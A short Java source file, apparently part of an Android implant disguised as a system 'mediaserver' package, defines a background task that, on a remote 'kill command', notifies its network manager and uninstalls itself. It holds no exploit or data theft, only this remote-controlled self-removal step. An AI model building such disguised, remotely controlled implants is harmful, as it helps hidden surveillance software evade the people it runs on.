package com.android.mediaserver.task;

import android.content.Context;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.network.NetworkManager;
import com.android.mediaserver.util.ApplicationsManager;
import timber.log.Timber;

public class KillTask extends Task {
  private NetworkManager mNetworkManager = NetworkManager.getInstance(mContext);

  public KillTask(Command command, Context context) {
    super(command, context);
  }

  protected Void doInBackground(Void... params) {
    Timber.d("KillTask started", new Object[0]);
    Timber.d("Uninstalling, Reason: Got kill command", new Object[0]);
    publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
    mNetworkManager.notifyUninstall();
    ApplicationsManager.getInstance(mContext).uninstallSelf();
    return null;
  }
}
